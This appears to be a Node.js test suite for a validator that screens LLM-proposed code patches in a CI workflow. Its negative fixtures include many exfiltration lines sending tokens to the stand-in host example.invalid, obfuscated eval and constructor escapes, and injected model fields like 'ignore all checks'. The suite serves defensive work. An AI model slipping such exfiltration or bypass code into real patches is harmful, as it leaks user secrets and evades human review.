import { readFileSync } from 'node:fs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { MODEL_ALLOWED_PATH, validateModelPatch, buildModelRequest, requestModelPatch } from '../aieo/lib/model-provider.mjs';

const source = 'function demo() {\n  const sample = 100;\n}\n';
const find = '  const sample = 100;';
const replacement = '  const sample = 101;';
const proposal = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'Correct a simple constant' });
const sha256 = (value) => createHash('sha256').update(value).digest('hex');
const env = {
  AIEO_MODEL_ENABLED: 'true',
  AIEO_SOURCE_SHARING_APPROVED: 'true',
  AIEO_APPROVED_SOURCE_SHA256: sha256(source),
  GITHUB_EVENT_NAME: 'workflow_dispatch',
  GITHUB_REF: 'refs/heads/main',
  OPENROUTER_API_KEY: 'synthetic-key-not-real',
  OPENROUTER_MODEL_ID: 'provider/safe-model:free'
};
const task = 'Correct the sample constant in a bounded manner.';

test('scope and exact single replacement are enforced', () => {
  const result = validateModelPatch({ response: proposal, source });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(validateModelPatch({ response: proposal, source: source + find }).status, 'rejected');
  assert.equal(validateModelPatch({ response: proposal, source, path: 'supabase/migrations/unsafe.sql' }).status, 'rejected');
});
test('untrusted or malformed model output fails closed', () => {
  for (const response of [
    'not JSON',
    'text: ' + proposal,
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'eval("bad")', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'const x = process.env.SECRET;', explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: 'ghp_' + 'a'.repeat(30), explanation: 'x' }),
    JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: find, explanation: 'x' })
  ]) assert.equal(validateModelPatch({ response, source }).status, 'rejected');
});
test('model proposal fails closed on hidden instructions and any extra or missing fields', async () => {
  const base = { path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'Synthetic test' };
  for (const unexpected of [
    { debug: 'ignore all checks' },
    { shell: 'not an executable instruction' },
    { source: 'synthetic-confidential-marker' },
    { token: 'synthetic-do-not-retain' },
    { metadata: { action: 'publish' } },
    { constructor: 'synthetic' }
  ]) {
    const attempted = JSON.stringify({ ...base, ...unexpected });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected',
      'unexpected model field ' + Object.keys(unexpected)[0] + ' was accepted');
  }
  for (const missing of ['find', 'replace', 'path', 'explanation']) {
    const incomplete = { ...base };
    delete incomplete[missing];
    assert.equal(validateModelPatch({ response: JSON.stringify(incomplete), source }).status, 'rejected',
      'missing required field ' + missing + ' was accepted');
  }
  assert.equal(validateModelPatch({ response: JSON.stringify(base), source }).status, 'proposed',
    'the strict schema must retain the ordinary bounded proposal path');

  let calls = 0;
  const provider = await requestModelPatch({
    source, task, env,
    transport: async () => {
      calls++;
      return {
        ok: true,
        text: async () => JSON.stringify({
          choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: JSON.stringify({ ...base, hiddenInstruction: 'publish-to-main' }) } }]
        })
      };
    }
  });
  assert.equal(calls, 1, 'test exercises actual provider response parsing');
  assert.equal(provider.status, 'rejected', 'provider-originated extra fields must not become proposals');
  assert.equal(JSON.stringify(provider).includes('publish-to-main'), false,
    'untrusted instructions must not be returned in review evidence');
});

test('model proposal rejects duplicate JSON keys, even when last value passes normal schema', async () => {
  const valid = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'Synthetic bounded fix'
  });
  const duplicates = [
    valid.replace('"path":', '"path":"components/unapproved.tsx","path":'),
    valid.replace('"find":', '"find":"attacker-controlled match","find":'),
    valid.replace('"replace":', '"replace":"untrusted code","replace":'),
    valid.replace('"explanation":', '"explanation":"hidden instruction","explanation":'),
    valid.replace('"find":', '"\\u0066ind":"escaped duplicate key","find":')
  ];
  for (const ambiguous of duplicates) {
    assert.equal(JSON.parse(ambiguous).path, MODEL_ALLOWED_PATH,
      'fixture must remain syntactically valid JSON accepted by native parser');
    assert.equal(validateModelPatch({ response: ambiguous, source }).status, 'rejected',
      'duplicate or escaped-duplicate proposal key was accepted');
  }

  // Backslashes, quotes, braces and JSON-like text *inside* string values
  // are ordinary data and must not trigger a false-positive duplicate.
  const validEscaped = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: replacement,
    explanation: 'Text: {"find":"example"} and an escaped quote " here'
  }).replace('"find":', '"\\u0066ind":');
  assert.equal(validateModelPatch({ response: validEscaped, source }).status, 'proposed');
  for (const invalid of [
    valid + '\n' + valid,
    valid.replace('"explanation":', '"explanation":null,"unused":'),
    valid.replace('"path":', '"path":{"nested":"object"},"path":'),
    valid.replace('"find":', '"find":"bad\\q","find":')
  ]) {
    assert.equal(validateModelPatch({ response: invalid, source }).status, 'rejected');
  }

  let calls = 0;
  const result = await requestModelPatch({
    source, task, env,
    transport: async () => {
      calls++;
      return {
        ok: true,
        text: async () => JSON.stringify({ choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: duplicates[1] } }] })
      };
    }
  });
  assert.equal(calls, 1);
  assert.equal(result.status, 'rejected');
  assert.equal(JSON.stringify(result).includes('attacker-controlled'), false,
    'untrusted duplicate-key text must never become an evidence field');
});

test('no source disclosure without explicit consent and privacy scan', () => {
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: false }));
  assert.throws(() => buildModelRequest({ source: 'const api_key = "plaintext-secret";', task, model: env.OPENROUTER_MODEL_ID, shareApproved: true }));
  assert.throws(() => buildModelRequest({ source, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true, path: '.env' }));
});
test('manual restrictions block all network calls on PR, missing secret, or missing consent', async () => {
  let calls = 0;
  const transport = () => { calls += 1; throw new Error('must not call'); };
  const variants = [
    { ...env, GITHUB_EVENT_NAME: 'pull_request' },
    { ...env, OPENROUTER_API_KEY: '' },
    { ...env, AIEO_SOURCE_SHARING_APPROVED: 'false' },
    { ...env, GITHUB_REF: 'refs/heads/feature' },
    { ...env, AIEO_APPROVED_SOURCE_SHA256: '' },
    { ...env, AIEO_APPROVED_SOURCE_SHA256: '0'.repeat(64) },
    { ...env, AIEO_APPROVED_SOURCE_SHA256: 'A'.repeat(64) }
  ];
  for (const current of variants) assert.equal((await requestModelPatch({ source, task, env: current, transport })).status, 'blocked');
  assert.equal((await requestModelPatch({ source: source + '// modified after consent', task, env, transport })).status, 'blocked');
  assert.equal(calls, 0);
});
test('mock provider call sends bounded source and returns validated proposal only', async () => {
  let requests = 0;
  const transport = async (url, opts) => {
    requests += 1;
    assert.equal(url, 'https://openrouter.ai/api/v1/chat/completions');
    assert.equal(opts.method, 'POST');
    assert.equal(opts.headers.Authorization, 'Bearer synthetic-key-not-real');
    const body = JSON.parse(opts.body);
    assert.equal(body.model, env.OPENROUTER_MODEL_ID);
    assert.ok(body.messages[1].content.includes(source));
    assert.equal(JSON.stringify(body).includes(env.OPENROUTER_API_KEY), false);
    return { ok: true, text: async () => JSON.stringify({ choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: proposal } }] }) };
  };
  const result = await requestModelPatch({ source, task, env, transport });
  assert.equal(result.status, 'proposed');
  assert.equal(result.patchedSource, source.replace(find, replacement));
  assert.equal(requests, 1);
});
test('provider requires a single completed assistant response before accepting a patch', async () => {
  // These are syntactically valid and contain an otherwise acceptable patch.
  // Older versions silently promoted truncated, tool-call, or forged responses.
  const complete = { finish_reason: 'stop', message: { role: 'assistant', content: proposal } };
  const invalidEnvelopes = [
    { choices: [{ message: complete.message }] }, // missing finish reason
    { choices: [{ ...complete, finish_reason: 'length' }] },
    { choices: [{ ...complete, finish_reason: 'content_filter' }] },
    { choices: [{ ...complete, finish_reason: 'tool_calls' }] },
    { choices: [{ ...complete, finish_reason: null }] },
    { choices: [{ ...complete, message: { role: 'user', content: proposal } }] },
    { choices: [{ ...complete, message: { content: proposal } }] },
    { choices: [complete, complete] },
    { choices: complete },
    { choices: [] }
  ];
  let calls = 0;
  for (const envelope of invalidEnvelopes) {
    const response = await requestModelPatch({
      source, task, env,
      transport: async () => {
        calls++;
        return { ok: true, text: async () => JSON.stringify(envelope) };
      }
    });
    assert.deepEqual(response, { status: 'rejected', reason: 'Incomplete or untrusted provider completion' });
    assert.equal(JSON.stringify(response).includes(proposal), false, 'do not expose model response in evidence');
  }
  assert.equal(calls, invalidEnvelopes.length, 'test must exercise real adapter response parsing');
  const valid = await requestModelPatch({
    source, task, env,
    transport: async () => ({
      ok: true, text: async () => JSON.stringify({ choices: [complete] })
    })
  });
  assert.equal(valid.status, 'proposed', 'normal completed assistant response remains eligible');
});

test('provider rejects duplicate envelope keys, including nested escaped aliases', async () => {
  const complete = { finish_reason: 'stop', message: { role: 'assistant', content: proposal } };
  const validEnvelope = JSON.stringify({ choices: [complete] });
  const forgedEnvelopes = [
    validEnvelope.replace('"choices":', '"choices":[],"choices":'),
    validEnvelope.replace('"finish_reason":', '"finish_reason":"length","finish_reason":'),
    validEnvelope.replace('"role":', '"\\u0072ole":"user","role":'),
    validEnvelope.replace('"message":', '"message":{"role":"user"},"message":'),
    validEnvelope.replace('"content":', '"content":"untrusted","content":')
  ];
  let called = 0;
  for (const forged of forgedEnvelopes) {
    // JSON.parse is last-value-wins here, so only the new envelope scanner
    // can reject the conflicting metadata before model output is promoted.
    assert.equal(JSON.parse(forged).choices[0].message.role, 'assistant');
    const result = await requestModelPatch({
      source, task, env,
      transport: async () => {
        called++;
        return { ok: true, text: async () => forged };
      }
    });
    assert.deepEqual(result, { status: 'rejected', reason: 'Ambiguous provider envelope' });
    assert.equal(JSON.stringify(result).includes(proposal), false,
      'never include untrusted response content in evidence');
  }
  assert.equal(called, forgedEnvelopes.length);
  const accepted = await requestModelPatch({
    source, task, env,
    transport: async () => ({ ok: true, text: async () => validEnvelope })
  });
  assert.equal(accepted.status, 'proposed', 'an ordinary unambiguous provider envelope remains valid');
});

test('provider errors do not expose source or credentials', async () => {
  const failed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: false }) });
  assert.deepEqual(failed, { status: 'failed', reason: 'Provider did not accept request' });
  const malformed = await requestModelPatch({ source, task, env, transport: async () => ({ ok: true, text: async () => 'garbage' }) });
  assert.equal(malformed.status, 'rejected');
});

test('model replacements cannot add browser side-channel transports', () => {
  for (const replacement of [
    'window.open("https://example.invalid/?data=" + token);',
    'navigator["sendBeacon"]("https://example.invalid", body);',
    'const pixel = new Image();',
    'location.assign("https://example.invalid");',
    'window.location.href = "https://example.invalid";',
    'document.createElement("iframe");',
    'globalThis["fetch"]("https://example.invalid");'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal rejects markup and CSS side channels without fetch calls', () => {
  for (const replacement of [
    '<img src={\`https://example.invalid/?secret=\${token}\`} />',
    '<a href={unsafeUrl}>Open</a>',
    '<form action={target}>Send</form>',
    '<iframe\n src={unsafeUrl} />',
    'const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };',
    'const style = { background: \`url(https://example.invalid/\${token})\` };'
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'synthetic safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('modern provider keys and bearer tokens are rejected before external source disclosure', async () => {
  const examples = [
    'sk-or-v1-' + 'a'.repeat(40),
    'github_pat_' + 'b'.repeat(42),
    'sk-proj-' + 'c'.repeat(42),
    'sb_secret_' + 'd'.repeat(36),
    'Bearer ' + 'e'.repeat(48)
  ];
  let sent = 0;
  const transport = async () => { sent += 1; throw new Error('source must not be sent'); };
  for (const marker of examples) {
    const unsafeSource = source + '\n// ' + marker;
    assert.throws(() => buildModelRequest({
      source: unsafeSource, task, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.throws(() => buildModelRequest({
      source, task: task + ' ' + marker, model: env.OPENROUTER_MODEL_ID, shareApproved: true
    }));
    assert.equal((await requestModelPatch({ source: unsafeSource, task, env: { ...env, AIEO_APPROVED_SOURCE_SHA256: sha256(unsafeSource) }, transport })).status, 'blocked');
    const unsafeProposal = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: '  const sample = "' + marker + '";',
      explanation: 'synthetic marker only'
    });
    assert.equal(validateModelPatch({ response: unsafeProposal, source }).status, 'rejected');
  }
  assert.equal(sent, 0, 'privacy rejection must happen before any HTTP attempt');
});

test('model proposal rejects block comment delimiters that could neutralize active code', () => {
  for (const replacement of [
    '  /* const sample = 101; */',
    '  const sample = 101; /* disabled auth guard */',
    '  const sample = 101; */'
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'synthetic comment bypass attempt'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected');
  }
});

test('provider source sharing refuses redirects and strips referrers', async () => {
  const result = await requestModelPatch({
    source, task, env,
    transport: async (url, opts) => {
      assert.equal(url, 'https://openrouter.ai/api/v1/chat/completions');
      assert.equal(opts.redirect, 'error');
      assert.equal(opts.referrerPolicy, 'no-referrer');
      return { ok: true, redirected: true, text: async () => { throw new Error('redirect body must not be read'); } };
    }
  });
  assert.equal(result.status, 'failed');
});

test('provider reads bounded streamed responses and rejects oversized bodies without buffering them', async () => {
  const encoded = new TextEncoder();
  const response = JSON.stringify({ choices: [{ finish_reason: 'stop', message: { role: 'assistant', content: proposal } }] });
  const streamOf = (value) => new ReadableStream({
    start(controller) {
      controller.enqueue(encoded.encode(value));
      controller.close();
    }
  });
  const good = await requestModelPatch({
    source, task, env,
    transport: async () => ({ ok: true, body: streamOf(response) })
  });
  assert.equal(good.status, 'proposed');
  assert.equal(good.patchedSource, source.replace(find, replacement));

  const tooLarge = await requestModelPatch({
    source, task, env,
    transport: async () => ({ ok: true, body: streamOf('x'.repeat(18001)) })
  });
  assert.equal(tooLarge.status, 'rejected');
  assert.equal(tooLarge.reason, 'Provider response too large');

  let readBody = false;
  const declaredOversize = await requestModelPatch({
    source, task, env,
    transport: async () => ({
      ok: true, headers: { get: () => '20000' },
      text: async () => { readBody = true; throw new Error('oversize body must not be read'); }
    })
  });
  assert.equal(declaredOversize.status, 'rejected');
  assert.equal(readBody, false);
});


test('model proposal rejects optional chaining, indirect browser APIs and aliases', () => {
  for (const replacement of [
    "fetch?.(\"https://example.invalid/?key=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
    "window?.[\"open\"]?.(\"https://example.invalid\");",
    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
    "const send = navigator.sendBeacon.bind(navigator);",
    "const forward = fetch; forward(\"https://example.invalid\");",
    "const transport = new WebTransport(\"https://example.invalid\");",
    "const stream = new EventSource(\"https://example.invalid\");",
    "const access = location?.assign;",
    "self[\"fetch\"](\"https://example.invalid\");",
  ]) {
    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace: replacement, explanation: 'indirect transport safety test' });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal refuses indirect HTML form, SVG, navigation and media transfers', () => {
  for (const replacement of [
    '<iframe srcDoc={untrustedMarkup} />',
    '<button formAction="https://example.invalid/collect">Send</button>',
    '<input type="image" src="https://example.invalid/pixel" />',
    '<a ping="https://example.invalid/track">Open</a>',
    '<svg><image href="https://example.invalid/pixel" /></svg>',
    '<svg><use xlink:href="https://example.invalid/asset" /></svg>',
    '<video poster="https://example.invalid/pixel" />',
    '<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'outbound markup regression fixture'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
});

test('model proposal refuses CSS imports and image-set network fetches', () => {
  for (const replacement of [
    'const css = `@import "https://example.invalid/style.css";`;',
    'const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
  ]) {
    const attempted = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'outbound CSS regression fixture'
    });
    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replacement);
  }
  const safe = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find,
    replace: '  const sample = 102;',
    explanation: 'simple static text only'
  });
  assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
});

test('model proposal blocks long padded outbound JSX attributes and hidden spread props', () => {
  for (const replacement of [
    '<img ' + ' '.repeat(360) + 'src={unsafeUrl} />',
    '<a ' + ' '.repeat(360) + 'href={unsafeUrl}>Open</a>',
    '<img {...{ src: unsafeUrl }} />',
    '<a {...untrustedProps}>Open</a>'
  ]) {
    const response = JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace: replacement,
      explanation: 'negative JSX outbound regression'
    });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replacement.slice(0, 50));
  }
  const response = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: '  const sample = 103;',
    explanation: 'safe, bounded fixture'
  });
  assert.equal(validateModelPatch({ response, source }).status, 'proposed');
});

test('quoted angle brackets, arrow expressions and nested JSX cannot conceal URL sinks', () => {
  const unsafe = [
    '<img alt="one > two" src={unsafeUrl} />',
    "<a title='left > right' href={unsafeUrl}>Open</a>",
    '<img onLoad={() => 1 > 0} src={unsafeUrl} />',
    '<div content={<img src={unsafeUrl} />} />',
    '<Widget title="one > two" {...unsafeProps} />'
  ];
  for (const replace of unsafe) {
    const candidate = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'quoted angle regression' });
    assert.equal(validateModelPatch({ response: candidate, source }).status, 'rejected', replace);
  }
  const replace = '<span title="one > two">Safe label</span>';
  const candidate = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'benign angle bracket' });
  assert.equal(validateModelPatch({ response: candidate, source }).status, 'proposed');
});

test('model validator inspects complete JSX tags when replacement starts inside an existing tag', () => {
  const markup = 'const view = <img\\n  alt="safe"\\n/>;\\n'.replaceAll('\\n', '\n');
  const fragment = '  alt="safe"';
  for (const replacement of [
    '  alt="safe" src={token}',
    '  alt="safe" {...forwardedProps}'
  ]) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: fragment, replace: replacement, explanation: 'partial tag regression' });
    assert.equal(validateModelPatch({ response, source: markup }).status, 'rejected', replacement);
  }
  const response = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find: fragment,
    replace: '  alt="updated safe"', explanation: 'ordinary label edit'
  });
  assert.equal(validateModelPatch({ response, source: markup }).status, 'proposed');
});


test('custom JSX components cannot introduce URL-bearing props', () => {
  const attemptedReplacements = [
    '<RemoteImage src={privateUrl} />',
    '<RouterLink href={privateUrl}>Follow</RouterLink>',
    '<Widget xlink:href={privateUrl} />',
    '<Card title="safe" srcSet={privateUrl} />'
  ];
  for (const replace of attemptedReplacements) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
      explanation: 'synthetic custom JSX URL regression' });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
  }
  const partialSource = 'const node = <RemoteImage alt="safe" />;\n';
  const partial = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: 'alt="safe image"',
    replace: 'alt="safe image" src={privateUrl}', explanation: 'partial attr injection' });
  assert.equal(validateModelPatch({ response: partial, source: partialSource.replace('alt="safe"', 'alt="safe image"') }).status, 'rejected');
  assert.equal(validateModelPatch({ response: JSON.stringify({ path: MODEL_ALLOWED_PATH,
    find, replace: '<Display label="safe" />', explanation: 'safe custom component' }), source }).status, 'proposed');
});


test('model-generated UI edits cannot reuse the existing Supabase client', () => {
  // Existing imports and the protected submit handler stay untouched. Only
  // newly proposed text is scanned, so ordinary UI edits remain possible.
  for (const replace of [
    'const result = supabase.from("profiles").select("*");',
    'void supabase.from("feedback").insert({ message: secret });',
    'const session = supabase.auth.getSession();',
    'const client = supabase;',
    'const { from } = supabase;'
  ]) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'synthetic SDK reuse regression' });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
  }
  const benign = JSON.stringify({
    path: MODEL_ALLOWED_PATH, find, replace: '  const sample = 105;',
    explanation: 'safe static UI content'
  });
  assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
});

test('model validator rejects reflective and bare browser-global access, not just direct calls', () => {
  for (const replace of [
    'const leak = Reflect.get(globalThis, "fetch")("https://example.invalid/collect");',
    'const transport = (0, fetch); transport("https://example.invalid/collect");',
    'const dynamic = (() => {}).constructor("return 2")();',
    'const client = window;',
    'const worker = SharedWorker;'
  ]) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
      explanation: 'synthetic reflective bypass regression' });
    assert.equal(validateModelPatch({ response, source }).status, 'rejected', replace);
  }
  const safe = JSON.stringify({ path: MODEL_ALLOWED_PATH, find,
    replace: '  const sample = 106;', explanation: 'benign edit' });
  assert.equal(validateModelPatch({ response: safe, source }).status, 'proposed');
});

// This one-file model workflow is for presentation changes, not new reactive
// code paths. An onClick/onError binding can call an existing privileged method
// without adding a network API, so reject new event bindings at proposal time.
test('model proposal rejects executable JSX props and raw HTML rendering before the review stages', () => {
  const original = 'const view = <Widget label="old" />;\n';
  const before = 'const view = <Widget label="old" />;';
  for (const after of [
    'const view = <Widget onClick={runPrivilegedAction} />;',
    'const view = <input onChange={() => submit()} />;',
    'const view = <img onError={() => sendData()} />;',
    'const view = <div dangerouslySetInnerHTML={{ __html: rawContent }} />;'
  ]) {
    const attempt = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: before, replace: after,
      explanation: 'test-only event-handler injection' });
    assert.equal(validateModelPatch({ response: attempt, source: original }).status,
      'rejected', after);
  }
  const benign = JSON.stringify({ path: MODEL_ALLOWED_PATH, find: before,
    replace: 'const view = <Widget label="new" />;', explanation: 'text-only fixture' });
  assert.equal(validateModelPatch({ response: benign, source: original }).status, 'proposed');
});

test('model proposal rejects retargeting an unchanged privileged JSX callback by changing its element type', () => {
  const original = 'const view = <div className="idle" onClick={performSensitiveAction} />;\n';
  const proposed = JSON.stringify({ path: MODEL_ALLOWED_PATH,
    find: 'const view = <div className',
    replace: 'const view = <button className',
    explanation: 'negative event-owner reassignment fixture' });
  assert.equal(validateModelPatch({ response: proposed, source: original }).status, 'rejected',
    'an unchanged onClick expression is unsafe if the owning JSX element changes');
  const benign = JSON.stringify({ path: MODEL_ALLOWED_PATH,
    find: 'className="idle"', replace: 'className="ready"',
    explanation: 'safe styling update on unchanged event owner' });
  assert.equal(validateModelPatch({ response: benign, source: original }).status, 'proposed');
});


test('model proposal preserves existing JSX callback expressions during class updates', () => {
  const original = 'const view = <><button onClick={approve} className="idle">Approve</button><button onClick={cancel}>Cancel</button></>;\n';
  const propose = (find, replace) => validateModelPatch({
    source: original,
    response: JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'bounded handler fixture' })
  });
  // This substitution does not introduce an onClick= attribute: the old
  // name-only comparison accepted the changed callback expression.
  assert.equal(propose('{approve} className="idle"', '{cancel} className="idle"').status, 'rejected');
  assert.equal(propose('className="idle">Approve', 'className="ready">Approve').status, 'proposed');
});

test('model proposal refuses encoded and computed executable primitives before applying changes', () => {
  const crafted = [
    '  const sample = ([])["fil" + "ter"]["con" + "structor"]("return 7")();',
    String.raw`  const sample = ({}).\u0063onstructor;`,
    String.raw`  const sample = global\u0054his['fe' + 'tch']('/private');`
  ];
  for (const replace of crafted) {
    const response = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'adversarial fixture' });
    const verdict = validateModelPatch({ source, response });
    assert.equal(verdict.status, 'rejected', 'obfuscated executable property must not be proposed: ' + replace);
  }
  assert.equal(validateModelPatch({ source, response: proposal }).status, 'proposed',
    'a benign bounded constant edit must remain eligible');
});

test('FeedbackWidget model proposals cannot change component state or executable JSX expressions', () => {
  const component = [
    'export default function FeedbackWidget() {',
    '  const allowed = true;',
    '  return <>',
    '    <p className="old">{allowed} Hello</p>',
    '  </>;',
    '}',
    ''
  ].join('\n');
  const propose = (find, replace) => validateModelPatch({
    source: component,
    response: JSON.stringify({
      path: MODEL_ALLOWED_PATH, find, replace, explanation: 'Synthetic bounded UI test'
    })
  });
  assert.equal(propose('  const allowed = true;', '  const allowed = false;').status, 'rejected',
    'changing control state ahead of the JSX return is executable logic');
  assert.equal(propose('    <p className="old">{allowed} Hello</p>',
    '    <p className="old">{isAllowed()} Hello</p>').status, 'rejected',
    'inserting a call inside a previously static JSX expression is executable logic');
  assert.equal(propose('    <p className="old">{allowed} Hello</p>',
    '    <div className="old">{allowed} Hello</div>').status, 'rejected',
    'changing JSX element structure is not a static copy edit');
  assert.equal(propose('    <p className="old">{allowed} Hello</p>',
    '    <p role="button" className="old">{allowed} Hello</p>').status, 'rejected',
    'adding behavioral attributes must not bypass model validation');
  assert.equal(propose('    <p className="old">{allowed} Hello</p>',
    '    <p className="new">{allowed} Welcome</p>').status, 'proposed',
    'literal label and static CSS class changes may remain in scope');
});

test('real checked-out FeedbackWidget supports a harmless outer label edit, not a state change', () => {
  const real = readFileSync(new URL('../components/FeedbackWidget.tsx', import.meta.url), 'utf8');
  const propose = (find, replace) => validateModelPatch({
    source: real,
    response: JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace, explanation: 'Real-source safety regression' })
  });
  assert.equal(propose(' ملاحظات الاختبار</button>', ' ملاحظات التجربة</button>').status, 'proposed',
    'a simple text node outside executable JSX expressions must remain editable');
  assert.equal(propose('  const [open, setOpen] = useState(false);',
    '  const [open, setOpen] = useState(true);').status, 'rejected');
});
